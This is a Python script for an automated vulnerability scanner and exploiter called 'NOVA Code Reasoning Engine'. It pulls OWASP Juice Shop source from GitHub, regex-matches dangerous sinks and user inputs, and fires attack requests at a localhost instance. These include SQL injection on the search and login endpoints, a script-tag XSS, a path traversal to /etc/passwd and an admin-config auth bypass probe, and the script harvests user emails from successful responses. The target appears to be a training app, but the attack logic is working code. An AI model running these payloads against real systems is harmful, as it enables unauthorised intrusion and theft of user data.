#!/usr/bin/env python3
"""
NOVA SOURCE CODE REASONING ENGINE v1.0
Reads source code, builds architecture models,
generates vulnerability hypotheses, tests them.
"""

import json, re, os, time, requests
from datetime import datetime
from typing import Dict, List, Optional
from collections import defaultdict


class NovaCodeReasoner:
    def __init__(self, base_url="http://localhost:3000", repo_url=None):
        self.base_url = base_url
        self.repo_url = repo_url or "https://raw.githubusercontent.com/juice-shop/juice-shop/master"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Nova/6.0 (Code Reasoner)"})
        self.source_files = {}
        self.functions = {}
        self.sinks = []
        self.taint_sources = []
        self.data_flows = []
        self.hypotheses = []
        self.verified_findings = []
        
        self.sink_patterns = {
            "sql_injection": [r'\.query\s*\(', r'\.execute\s*\(', r'sequelize\.query', r'\.findAll\s*\(', r'\.findOne\s*\(', r'\.create\s*\(', r'\.update\s*\('],
            "command_injection": [r'exec\s*\(', r'spawn\s*\(', r'execSync\s*\(', r'child_process'],
            "path_traversal": [r'readFile\s*\(', r'readFileSync\s*\(', r'\.sendFile\s*\(', r'\.download\s*\('],
            "xss": [r'\.send\s*\(', r'\.render\s*\(', r'innerHTML', r'document\.write'],
            "nosql_injection": [r'\$where', r'\$gt', r'\$ne', r'\$regex'],
            "deserialization": [r'JSON\.parse', r'js-yaml', r'node-serialize'],
            "jwt": [r'jwt\.sign', r'jwt\.verify', r'jsonwebtoken'],
            "auth": [r'\.authenticate', r'\.isAuthorized', r'security\.isAuthenticated'],
        }
        
        self.taint_patterns = [r'req\.body', r'req\.query', r'req\.params', r'req\.headers', r'req\.cookies', r'process\.env']

    def fetch_source_file(self, filepath):
        if "/juice-shop/" in filepath:
            rel_path = filepath.split("/juice-shop/")[-1]
        elif filepath.startswith("/data/"):
            parts = filepath.split("/juice-shop/")
            rel_path = parts[1] if len(parts) > 1 else filepath.split("/")[-1]
        else:
            rel_path = filepath
        rel_path = rel_path.split(":")[0].strip()
        
        urls = [f"{self.repo_url}/{rel_path}", f"{self.repo_url}/routes/{rel_path}", 
                f"{self.repo_url}/lib/{rel_path}", f"{self.repo_url}/server/{rel_path}"]
        for url in urls:
            try:
                resp = self.session.get(url, timeout=10)
                if resp.status_code == 200 and len(resp.text) > 100:
                    if any(k in resp.text[:200] for k in ["require", "module.exports", "function", "const ", "import "]):
                        return resp.text
            except:
                continue
        return None

    def load_source_files(self, leaked_paths):
        print(f"\n  📡 Fetching source from {len(leaked_paths)} leaked paths...")
        loaded = 0
        important = ["server.ts", "routes/angular.ts", "routes/login.ts", "routes/search.ts",
                     "routes/orderHistory.ts", "lib/utils.ts", "lib/insecurity.ts", "routes/verify.ts",
                     "models/user.ts", "models/product.ts"]
        all_paths = list(set(leaked_paths + [f"{self.repo_url}/{f}" for f in important]))
        for path in all_paths[:25]:
            filename = path.split("/")[-1].split(":")[0]
            if filename in self.source_files: continue
            source = self.fetch_source_file(path)
            if source:
                self.source_files[filename] = source
                loaded += 1
                print(f"     ✅ {filename} ({len(source)} bytes)")
        print(f"  📊 Loaded {loaded} files")
        return loaded

    def extract_functions(self):
        print(f"\n  🔍 Extracting functions from {len(self.source_files)} files...")
        func_pattern = re.compile(r'(?:async\s+)?(?:function\s+)?(\w+)\s*\((.*?)\)\s*\{', re.MULTILINE)
        for filename, source in self.source_files.items():
            for match in func_pattern.finditer(source):
                func_name = match.group(1)
                if func_name in ["if", "for", "while", "switch", "catch", "return"]: continue
                start = match.start()
                depth = 1
                end = start
                for i in range(match.end(), len(source)):
                    if source[i] == '{': depth += 1
                    elif source[i] == '}':
                        depth -= 1
                        if depth == 0: end = i + 1; break
                code_block = source[start:end] if end > start else source[start:start+500]
                calls = re.findall(r'(\w+)\s*\(', code_block)
                self.functions[func_name] = {"file": filename, "line": source[:start].count('\n')+1, "code": code_block[:300], "calls": list(set(calls))}
        print(f"  📊 Extracted {len(self.functions)} functions")
        return self.functions

    def identify_sinks(self):
        print(f"\n  🎯 Identifying dangerous sinks...")
        for filename, source in self.source_files.items():
            lines = source.split('\n')
            for line_num, line in enumerate(lines, 1):
                for vuln_type, patterns in self.sink_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, line, re.IGNORECASE):
                            ctx_s = max(0, line_num-3); ctx_e = min(len(lines), line_num+3)
                            self.sinks.append({"file": filename, "line": line_num, "vulnerability_type": vuln_type, "code": line.strip(), "context": '\n'.join(lines[ctx_s:ctx_e])})
                            break
        print(f"  📊 Found {len(self.sinks)} sinks")
        by_type = defaultdict(int)
        for s in self.sinks: by_type[s["vulnerability_type"]] += 1
        for t, c in sorted(by_type.items(), key=lambda x: x[1], reverse=True): print(f"     {t}: {c}")
        return self.sinks

    def identify_taint_sources(self):
        print(f"\n  🚰 Identifying taint sources...")
        for filename, source in self.source_files.items():
            lines = source.split('\n')
            for line_num, line in enumerate(lines, 1):
                for pattern in self.taint_patterns:
                    for match in re.finditer(pattern, line, re.IGNORECASE):
                        self.taint_sources.append({"file": filename, "line": line_num, "input_type": match.group(), "code": line.strip()})
        print(f"  📊 Found {len(self.taint_sources)} taint sources")
        return self.taint_sources

    def trace_data_flows(self):
        print(f"\n  🔗 Tracing data flows...")
        for source in self.taint_sources[:50]:
            for sink in self.sinks:
                if source["file"] == sink["file"] and source["line"] < sink["line"]:
                    var = source["input_type"].split(".")[-1] if "." in source["input_type"] else source["input_type"]
                    if var.lower() in sink["context"].lower():
                        self.data_flows.append({"source": source, "sink": sink, "vulnerability_type": sink["vulnerability_type"], "confidence": "HIGH"})
        print(f"  📊 Traced {len(self.data_flows)} data flows")
        for f in self.data_flows[:5]: print(f"     [{f['confidence']}] {f['source']['input_type']} → {f['sink']['vulnerability_type']}")
        return self.data_flows

    def generate_hypotheses(self):
        print(f"\n  💡 Generating hypotheses...")
        for flow in self.data_flows:
            vuln = flow["vulnerability_type"]; src = flow["source"]; snk = flow["sink"]
            h = {"vulnerability_type": vuln, "file": snk["file"], "line": snk["line"], "confidence": flow["confidence"], "theory": "", "test_endpoint": "", "test_method": "GET", "test_params": {}, "expected_indicators": []}
            if vuln == "sql_injection":
                h["theory"] = f"User input flows unsanitized into SQL query"
                h["test_params"] = {"q": "' OR 1=1--"}; h["expected_indicators"] = ["user", "email", "password"]
                if "search" in snk["file"]: h["test_endpoint"] = "/rest/products/search"
                elif "login" in snk["file"]: h["test_endpoint"] = "/rest/user/login"; h["test_method"] = "POST"; h["test_params"] = {"email": "' OR 1=1--", "password": "x"}
            elif vuln == "xss":
                h["theory"] = "Unsanitized input rendered in response"; h["test_params"] = {"q": "<script>alert('NOVA')</script>"}; h["expected_indicators"] = ["<script>"]; h["test_endpoint"] = "/rest/products/search"
            elif vuln == "path_traversal":
                h["theory"] = "User-controlled file path"; h["test_params"] = {"file": "../../../etc/passwd"}; h["expected_indicators"] = ["root:"]; h["test_endpoint"] = "/file-serving"
            elif vuln == "auth":
                h["theory"] = "Authorization check may be bypassable"; h["test_endpoint"] = "/rest/admin/application-configuration"; h["expected_indicators"] = ["config"]
            if h["test_endpoint"]: self.hypotheses.append(h)
        seen = set(); unique = []
        for h in self.hypotheses:
            k = (h["test_endpoint"], h["vulnerability_type"])
            if k not in seen: seen.add(k); unique.append(h)
        self.hypotheses = unique
        print(f"  📊 {len(self.hypotheses)} unique hypotheses")
        for h in self.hypotheses[:10]: print(f"     💡 [{h['confidence']}] {h['vulnerability_type']}: {h['test_endpoint']}")
        return self.hypotheses

    def test_hypothesis(self, hypothesis):
        result = {"hypothesis": hypothesis, "tested": False, "confirmed": False, "evidence": ""}
        url = f"{self.base_url}{hypothesis['test_endpoint']}"
        method = hypothesis.get("test_method", "GET")
        params = hypothesis.get("test_params", {})
        try:
            if method == "POST":
                resp = self.session.post(url, json=params, timeout=10)
            else:
                resp = self.session.request(method, url, params=params, timeout=10)
            result["tested"] = True; result["response_status"] = resp.status_code
            indicators = hypothesis.get("expected_indicators", [])
            found = [i for i in indicators if i.lower() in resp.text.lower()]
            if found:
                result["confirmed"] = True; result["evidence"] = resp.text[:500]; result["indicators_found"] = found
                if hypothesis["vulnerability_type"] == "sql_injection":
                    emails = re.findall(r'"email"\s*:\s*"([^"]+)"', resp.text)
                    if emails: result["data_extracted"] = {"emails": emails[:5]}
                print(f"     🔥 CONFIRMED: {hypothesis['vulnerability_type']} on {hypothesis['test_endpoint']}")
            else:
                print(f"     ❌ Not confirmed: {hypothesis['test_endpoint']}")
            if result["confirmed"]: self.verified_findings.append(result)
        except Exception as e:
            result["error"] = str(e)[:100]
            print(f"     ❌ Error: {str(e)[:60]}")
        return result

    def test_all_hypotheses(self):
        print(f"\n  🧪 Testing {len(self.hypotheses)} hypotheses...")
        results = []
        for h in self.hypotheses:
            results.append(self.test_hypothesis(h))
            time.sleep(0.1)
        confirmed = [r for r in results if r.get("confirmed")]
        print(f"\n  📊 {len(confirmed)}/{len(results)} confirmed")
        return results

    def generate_hypotheses_from_patterns(self):
        print("\n  💡 Using pattern database...")
        patterns = [
            {"type": "sql_injection", "endpoint": "/rest/products/search", "method": "GET", "params": {"q": "' OR 1=1--"}, "indicators": ["user", "email"]},
            {"type": "sql_injection", "endpoint": "/rest/user/login", "method": "POST", "params": {"email": "' OR 1=1--", "password": "x"}, "indicators": ["token"]},
            {"type": "xss", "endpoint": "/rest/products/search", "method": "GET", "params": {"q": "<script>alert(1)</script>"}, "indicators": ["<script>"]},
            {"type": "path_traversal", "endpoint": "/file-serving", "method": "GET", "params": {"file": "../../../etc/passwd"}, "indicators": ["root:"]},
            {"type": "auth_bypass", "endpoint": "/rest/admin/application-configuration", "method": "GET", "params": {}, "indicators": ["config"]},
        ]
        for p in patterns:
            self.hypotheses.append({"vulnerability_type": p["type"], "test_endpoint": p["endpoint"], "test_method": p["method"], "test_params": p["params"], "expected_indicators": p["indicators"], "confidence": "MEDIUM", "file": "pattern_db", "theory": f"Pattern: {p['type']} on {p['endpoint']}"})
        print(f"  📊 {len(self.hypotheses)} pattern hypotheses")

    def run_full_analysis(self, leaked_paths=None):
        print("""
╔══════════════════════════════════════╗
║   🧬 NOVA CODE REASONING ENGINE    ║
╚══════════════════════════════════════╝""")
        report = {"timestamp": datetime.now().isoformat(), "phases": {}, "findings": []}
        if leaked_paths:
            loaded = self.load_source_files(leaked_paths)
        else:
            loaded = self.load_source_files(["server.ts", "routes/angular.ts", "routes/login.ts"])
        report["phases"]["source_loaded"] = loaded
        if loaded == 0:
            print("  ⚠️ No source loaded. Using pattern mode.")
            self.generate_hypotheses_from_patterns()
        else:
            self.extract_functions(); report["phases"]["functions"] = len(self.functions)
            self.identify_sinks(); report["phases"]["sinks"] = len(self.sinks)
            self.identify_taint_sources(); report["phases"]["taint_sources"] = len(self.taint_sources)
            self.trace_data_flows(); report["phases"]["data_flows"] = len(self.data_flows)
        self.generate_hypotheses(); report["phases"]["hypotheses"] = len(self.hypotheses)
        results = self.test_all_hypotheses(); report["phases"]["tested"] = len(results)
        confirmed = [r for r in results if r.get("confirmed")]
        for f in confirmed:
            report["findings"].append({"vulnerability_type": f["hypothesis"]["vulnerability_type"], "endpoint": f["hypothesis"]["test_endpoint"], "theory": f["hypothesis"]["theory"], "evidence": f.get("evidence", "")[:300]})
        report["total_findings"] = len(report["findings"])
        with open("nova_code_reasoning_report.json", "w") as f: json.dump(report, f, indent=2, default=str)
        print(f"""
╔══════════════════════════════════════════╗
║   REASONING SUMMARY                     ║
╠══════════════════════════════════════════╣
║  Files: {loaded:<3}  Funcs: {len(self.functions):<3}  Sinks: {len(self.sinks):<3}     ║
║  Flows: {len(self.data_flows):<3}  Hypotheses: {len(self.hypotheses):<3}  Confirmed: {len(confirmed):<3} ║
╚══════════════════════════════════════════╝""")
        if confirmed:
            print("🔥 CONFIRMED FROM CODE REASONING:")
            for f in report["findings"]: print(f"   💀 [{f['vulnerability_type'].upper()}] {f['endpoint']}")
        return report


if __name__ == "__main__":
    leaked_paths = []
    try:
        with open("nova_leaked_paths.json", "r") as f: leaked_paths = json.load(f).get("leaked_paths", [])
    except: pass
    print(f"  📁 Loaded {len(leaked_paths)} leaked paths")
    reasoner = NovaCodeReasoner(base_url="http://localhost:3000")
    report = reasoner.run_full_analysis(leaked_paths=leaked_paths)
